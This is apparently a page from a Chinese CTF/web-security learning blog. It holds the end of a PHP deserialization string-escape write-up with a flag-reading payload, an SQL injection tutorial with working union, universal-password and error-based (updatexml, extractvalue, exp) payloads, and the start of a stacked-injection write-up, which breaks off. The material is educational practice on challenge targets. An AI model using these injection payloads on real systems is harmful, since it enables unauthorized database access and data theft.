class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$table, $key, $value, $where</span>) </span>&#123;</span><br><span class="line">		$sql = <span class="string">&quot;UPDATE $table SET $key = &#x27;$value&#x27; WHERE $where&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">		$escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		$string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">		$safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		$safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    register.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&#39;class.php&#39;);</span><br><span class="line">	if($_POST[&#39;username&#39;] &amp;&amp; $_POST[&#39;password&#39;]) &#123;</span><br><span class="line">		$username &#x3D; $_POST[&#39;username&#39;];</span><br><span class="line">		$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line"></span><br><span class="line">		if(strlen($username) &lt; 3 or strlen($username) &gt; 16) </span><br><span class="line">			die(&#39;Invalid user name&#39;);</span><br><span class="line"></span><br><span class="line">		if(strlen($password) &lt; 3 or strlen($password) &gt; 16) </span><br><span class="line">			die(&#39;Invalid password&#39;);</span><br><span class="line">		if(!$user-&gt;is_exists($username)) &#123;</span><br><span class="line">			$user-&gt;register($username, $password);</span><br><span class="line">			echo &#39;Register OK!&lt;a href&#x3D;&quot;index.php&quot;&gt;Please Login&lt;&#x2F;a&gt;&#39;;		</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			die(&#39;User name Already Exists&#39;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">......[省略html代码]</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    update.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&#39;class.php&#39;);</span><br><span class="line">	if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;</span><br><span class="line">		die(&#39;Login First&#39;);	</span><br><span class="line">	&#125;</span><br><span class="line">	if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123;</span><br><span class="line"></span><br><span class="line">		$username &#x3D; $_SESSION[&#39;username&#39;];</span><br><span class="line">		if(!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))</span><br><span class="line">			die(&#39;Invalid phone&#39;);</span><br><span class="line"></span><br><span class="line">		if(!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;]))</span><br><span class="line">			die(&#39;Invalid email&#39;);</span><br><span class="line"></span><br><span class="line">		if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)</span><br><span class="line">			die(&#39;Invalid nickname&#39;);</span><br><span class="line"></span><br><span class="line">		$file &#x3D; $_FILES[&#39;photo&#39;];</span><br><span class="line">		if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)</span><br><span class="line">			die(&#39;Photo size error&#39;);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]));</span><br><span class="line">		$profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];</span><br><span class="line">		$profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];</span><br><span class="line">		$profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname&#39;];</span><br><span class="line">		$profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">......[省略html代码]</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    profile.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&#39;class.php&#39;);</span><br><span class="line">	if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;</span><br><span class="line">		die(&#39;Login First&#39;);	</span><br><span class="line">	&#125;</span><br><span class="line">	$username &#x3D; $_SESSION[&#39;username&#39;];</span><br><span class="line">	$profile&#x3D;$user-&gt;show_profile($username);</span><br><span class="line">	if($profile  &#x3D;&#x3D; null) &#123;</span><br><span class="line">		header(&#39;Location: update.php&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		$profile &#x3D; unserialize($profile);</span><br><span class="line">		$phone &#x3D; $profile[&#39;phone&#39;];</span><br><span class="line">		$email &#x3D; $profile[&#39;email&#39;];</span><br><span class="line">		$nickname &#x3D; $profile[&#39;nickname&#39;];</span><br><span class="line">		$photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;]));</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">......[省略html代码]</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    config.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$config[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现<code>config.php</code>中有我们想要的flag.发现网页还有个注册接口，随便注册一个账号登陆上去，随后发现一个文件上传接口，这里可以首先考虑到上传一个木马，不过发现尽管没有过滤，而且我们也知道上传目录，但是因为文件名被md5加密，故无法使用蚁剑连接。</p>
<p>这个时候仔细审计一下代码，发现profile.php中有一个<code>file_get_contents</code>函数，同时发现了序列化和反序列化，序列化内容可控，这个时候可以考虑通过反序列化将<code>$profile</code>中的<code>photo</code>属性改变为<code>config.php</code>。</p>
<p>这个时候目标明确了，仔细审计<code>update.php</code>代码，发现有几个过滤，先是对输入的内容格式进行正则匹配，随后将输入的前三项内容和第四项内容的上传路径进行序列化，随后传给<code>update_profile</code>函数进行处理，跟进<code>update_profile</code>发现对<code>$username</code>和<code>$profile</code>进行过滤，跟进<code>filter</code>函数发现会将<code>&#39;</code>和<code>\\</code>替换成<code>_</code>，并将<code>&#39;select&#39; &#39;insert&#39; &#39;update&#39; &#39;delete&#39; &#39;where&#39;</code>替换为<code>&#39;hacker&#39;</code>。这个时候我们发现了重点：<code>filter</code>函数会将<code>where</code>替换成<code>hacker</code>，替换后字符串的长度发生了改变，而序列化字符串中字符串长度未改变，这个时候我们就可以通过反序列化字符串逃逸来实现将<code>file_get_contents</code>中的内容替换为<code>config.php</code>。</p>
<p>但是我们需要先绕过第一个正则匹配，这个时候我们需要一个前置知识：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">sha1(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">ereg(pattern,<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">preg_match(pattern,<span class="keyword">Array</span>()) = <span class="literal">false</span></span><br><span class="line">strcmp(<span class="keyword">Array</span>(),<span class="string">&quot;some_string&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strpos(<span class="keyword">Array</span>(),<span class="string">&quot;some_string&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strlen(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>所以我们只需要将<code>nickname</code>替换成数组即可。</p>
<p>我们构造如下payload:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>解释一下这个payload的构造原理，<code>nickname[]</code>被反序列化之后会变成<code>a:1:&#123;i:0;s:204:&quot;...&quot;;&#125;</code>，所以<code>where</code>后面的<code>&quot;;&#125;</code>用来闭合被替换后的序列化字符串中的第三个数组部分，同时由于<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>长度为34，我们需要将这34个字符挤出profile数组的第三位(我们为了绕过正则而构造的数组位)，所以利用filter中where替换成hacker会多出1位，构造34个where，从而反序列化时成功将第三位闭合。</p>
<p>最终执行效果：</p>
<img src="/assets/img/php反序列化尾部字符串逃逸学习/php反序列化尾部字符串逃逸学习1.jpg">

<img src="/assets/img/php反序列化尾部字符串逃逸学习/php反序列化尾部字符串逃逸学习2.jpg">

<img src="/assets/img/php反序列化尾部字符串逃逸学习/php反序列化尾部字符串逃逸学习3.jpg">

<p>成功获得flag。</p>
<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>web是个无底洞..知识点太多太杂了，所以还是要多总结，这样学习效率才高。还是太菜了，慢慢加油叭。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://su29029.github.io/2020/08/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%BE%E9%83%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/" data-id="ckedn8mtb000jfctybi1nfl1v" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-sql注入总结（一）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/28/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
  <time datetime="2020-08-28T02:34:54.000Z" itemprop="datePublished">2020-08-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>►<a class="article-category-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/28/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/">sql注入总结（一）</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>sql注入是个很复杂的东西，这里分多篇来总结一些常见的注入姿势。</p>
<h2 id="0x00-注入原理"><a href="#0x00-注入原理" class="headerlink" title="0x00 注入原理"></a>0x00 注入原理</h2><p>sql注入，即通过在sql查询的过程中通过构造特殊输入，改变原有sql语句的结构，从而实现执行攻击者想要执行的sql语句。<br>例如，我们有如下代码：   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">$query &#x3D; &quot;SELECT * FROM users WHERE id&#x3D;&quot; . $id;</span><br></pre></td></tr></table></figure>
<p>如果我们构造<code>/?id=1%20or%201=1</code>那么此时query将会变成<code>&quot;SELECT * FROM users WHERE id=1 or 1=1&quot;</code>,此时where后面的语句永远为真，故sql语句成功执行，造成sql注入。 </p>
<h2 id="0x01-注入类型"><a href="#0x01-注入类型" class="headerlink" title="0x01 注入类型"></a>0x01 注入类型</h2><h3 id="按变量类型分类"><a href="#按变量类型分类" class="headerlink" title="按变量类型分类"></a>按变量类型分类</h3><ul>
<li>数字型</li>
<li>字符型</li>
</ul>
<h3 id="按提交方式分类"><a href="#按提交方式分类" class="headerlink" title="按提交方式分类"></a>按提交方式分类</h3><ul>
<li>GET型</li>
<li>POST型</li>
<li>COOKIE型</li>
</ul>
<h3 id="按注入方式分类"><a href="#按注入方式分类" class="headerlink" title="按注入方式分类"></a>按注入方式分类</h3><ul>
<li>union联合查询注入</li>
<li>报错注入</li>
</ul>
<ul>
<li>盲注<ul>
<li>基于时间的盲注</li>
<li>基于布尔的盲注</li>
</ul>
</li>
</ul>
<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ul>
<li>宽字节注入</li>
</ul>
<h2 id="0x02-万能密码"><a href="#0x02-万能密码" class="headerlink" title="0x02 万能密码"></a>0x02 万能密码</h2><p>万能密码是指，在一个登录接口中如果存在sql注入，可以通过构造where子句永远为真从而实现登录。例如：   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username &#x3D; $_GET[&#39;username&#39;];</span><br><span class="line">$password &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">$query &#x3D; &quot;SELECT * FROM users WHERE username&#x3D;&#39;&quot; . $id . &quot;&#39;and password&#x3D;&#39;&quot; . $password . &quot;&#39;&quot;;</span><br></pre></td></tr></table></figure>
<p>首先我们知道<code>#</code>和<code>--</code>是sql语句中的注释，其中<code>--</code>后面需要加一个空格。这里我们巧妙构造输入<code>/?username=admin%27%20or%201=1%20%23</code>，这时sql语句变为<code>&quot;SELECT * FROM users WHERE username=&#39;admin&#39; or 1=1 #and password=&#39;&#39;&quot;</code>从而<code>and password=&#39;&#39;</code>这部分内容被注释掉了，sql语句永远为真，造成sql注入。   </p>
<h2 id="0x03-联合查询注入"><a href="#0x03-联合查询注入" class="headerlink" title="0x03 联合查询注入"></a>0x03 联合查询注入</h2><p>联合查询注入是一种常用的注入方式，它借助的是大于等于5.0版本的MySQL中的<code>information_schema</code>数据库，<code>information_schema</code>数据库中存储了MySQL服务器所维护的其他所有数据库的信息。例如数据库名，数据表名，列名，列的数据类型等。这时通过<code>union</code>关键字进行联合查询即可查询到大量信息。   </p>
<p>举个简单的题目的例子，2019极客大挑战的一道sql注入题。(复现环境<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a>)<br>拿到题目，使用<code>1&#39;</code>登录，发现sql报错，故存在注入点。<br><img src="/assets/img/sql注入总结（一）/sql注入总结（一）1.jpg"><br><img src="/assets/img/sql注入总结（一）/sql注入总结（一）2.jpg"><br>这里首先尝试万能密码登录，<code>/check.php?username=admin%27%20%23&amp;password=123</code>，发现成功登录，显示了登录用户名和一串密码。<br><img src="/assets/img/sql注入总结（一）/sql注入总结（一）3.jpg"><br>将第一个查询字段的<code>admin</code>置为一个不存在的值[不这么做的话会无法显示union select查询出的值]，然后判断列数，发现共计3列，尝试第四列则报错。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20order%20by%1,2,3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
<img src="/assets/img/sql注入总结（一）/sql注入总结（一）4.jpg">   

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20order%20by1,2,3,4%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
<img src="/assets/img/sql注入总结（一）/sql注入总结（一）5.jpg">   

<p>判断一下列名对应的内容：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20union%20select%201,2,3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
<img src="/assets/img/sql注入总结（一）/sql注入总结（一）6.jpg">   

<p>发现第二列对应username，第三列对应password。<br>下面开始union select注入。首先查数据库名。数据库名对应的是<code>information_schema.schemata</code>数据表，这里面存储的是所有数据库的信息。    </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20union%20select%201,(select%20group_concat(schema_name)%20from%20information_schema.schemata),3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
<img src="/assets/img/sql注入总结（一）/sql注入总结（一）7.jpg">    

<p>下一步查询数据表，所有数据表名信息存储在<code>information_schema.tables</code>数据表中。例如查询geek数据库的数据表名：   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20union%20select%201,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;&quot;geek&quot;),3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
<img src="/assets/img/sql注入总结（一）/sql注入总结（一）8.jpg">   

<p>下一步查询列名，所有列名信息存储在<code>information_schema.columns</code>数据表中。例如查询l0ve1ysq1表中的所有列名：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20union%20select%201,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema&#x3D;&quot;geek&quot;%20and%20table_name&#x3D;&quot;l0ve1ysq1&quot;),3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
<img src="/assets/img/sql注入总结（一）/sql注入总结（一）9.jpg">   
最后通过limit限制行数一行一行查询表中的内容，最终得到flag。  

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20union%20select%201,(select%20password%20from%20geek.l0ve1ysq1%20limit%2015,1),3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
<img src="/assets/img/sql注入总结（一）/sql注入总结（一）10.jpg">   

<h2 id="0x04-堆叠注入"><a href="#0x04-堆叠注入" class="headerlink" title="0x04 堆叠注入"></a>0x04 堆叠注入</h2><p>堆叠注入指的是在某些情况下，后端的sql语句执行函数可以执行多条命令(例如mysqli_multi_query())，这个时候我们可以通过<code>;</code>来结束前一条sql语句，随后再在分号后面写入sql，从而实现“堆一堆”sql语句进行注入。而<code>;</code>后的语句理论上没有过滤的话则可以为所欲为。<br>不过堆叠注入利用的条件有限，因为一般情况下后台的sql执行函数为安全起见只允许执行单一sql，分号后的语句将会被忽略。  </p>
<h2 id="0x05-报错注入"><a href="#0x05-报错注入" class="headerlink" title="0x05 报错注入"></a>0x05 报错注入</h2><p>报错注入一般应用在正确执行无回显，而若发生错误会显示错误的情况下。这时可以使用报错注入的方式获得数据库信息。<br>报错注入常用函数：   </p>
<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p>函数原型：<code>UPDATEXML(XML_document, XPath_string, new_value);</code><br>第一个参数：<code>XML_document</code>，是String格式，是XML文档对象的名称<br>第二个参数：<code>XPath_string</code>，XPath格式的字符串<br>第三个参数：<code>new_value</code>，String格式，替换查找到符合条件的数据<br>函数作用：改变文档中符合条件的节点的值。<br>注：updatexml最多只能显示32位，需要配合substr等字符串处理函数使用。<br>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;index.php?id&#x3D;1 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)</span><br></pre></td></tr></table></figure>
<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>函数原型：<code>EXTRACTVALUE(XML_document, XPath_string)</code><br>参数含义同上。<br>举例:   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;index.php?id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>
<h4 id="几何对象"><a href="#几何对象" class="headerlink" title="几何对象"></a>几何对象</h4><p>MySQL中支持的几何数据类型包括Geometry,Point,LineString,Polygon以及集合类型的MultiPoint,MultiLineString,MultiPolygon,GeometryCollection.其中Geometry可以表示任意一种几何类型，即在MySQL中，如果一个字段类型是Geometry，则可以存储Point、LineString等其它几何类型的值。其他的几种则需要固定有效的表示格式。<br>我们可以借助几何对象的相关函数进行报错注入。<br>geometrycollection():<code>id=1 and geometrycollection((select * from(select * from(select user())a)b))</code><br>multipoint():<code>id=1 and multipoint((select * from(select * from(select user())a)b))</code><br>polygon():<code>id=1 and polygon((select * from(select * from(select user())a)b))</code><br>multipolygon():<code>id=1 and multipolygon((select * from(select * from(select user())a)b))</code><br>linestring():<code>id=1 and linestring((select * from(select * from(select user())a)b))</code><br>multilinestring():<code>id=1 and multilinestring((select * from(select * from(select user())a)b))</code>   </p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><p>例子：<br><code>id=1 and exp(~(select * from(select user())a))</code>   </p>
<p>OK,先总结这么多，剩下的内容下次再总结。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://su29029.github.io/2020/08/28/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="ckedn8mtj0014fcty7aizho6d" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-20200315学习总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/28/20200315%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="article-date">
  <time datetime="2020-08-28T02:34:05.000Z" itemprop="datePublished">2020-08-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>►<a class="article-category-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/28/20200315%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">20200315学习总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="sql堆叠注入-stack-injection"><a href="#sql堆叠注入-stack-injection" class="headerlink" title="sql堆叠注入[stack injection]"></a>sql堆叠注入[stack injection]</h3><p>sql注入中，当我们无法使用select等查询语句时[通常来说是被过滤了]，我们可以考虑尝试堆叠注入。所谓堆叠注入，顾名思义，就是一次性执行多条sql语句。我们知道sql语句以分号<code>;</code>结束，故如果我们使用分号提前结束前一条sql语句，然后再在分号后面执行我们想执行的语句，最后注释掉原本后面的sql语句段，就能实现堆叠注入的效果，从而造成了sql注入。<br>不过sql堆叠注入的利用条件有限，通常只有在后台sql允许一次执行多条语句时才能利用。以一个题来举例子：<br>题目链接：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5417&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5417&amp;page=1</a><br>拿到题目先尝试<code>&#39;</code>发现sql报错，故判断存在sql注入点。随后<code>1&#39;or &#39;1&#39;=&#39;1</code>，发现有回显，随后借助<code>order by</code>发现有两列，但尝试union select查询时发现了下面这条提示：<br><img src="/assets/img/20200315学习总结/20200315学习总结1.jpg"><br>发现select，update，drop等等关键词都被过滤了，而且发现通过大小写，加注释等方式无法绕过，故只能放弃这一注入方式。随后尝试堆叠注入。<br>尝试显示一下所有数据库和所有数据表。<br><img src="/assets/img/20200315学习总结/20200315学习总结2.jpg"><br><img src="/assets/img/20200315学习总结/20200315学习总结3.jpg"><br>随后显示出words表和1919810931114514表的列：<br><img src="/assets/img/20200315学习总结/20200315学习总结4.jpg"><br><img 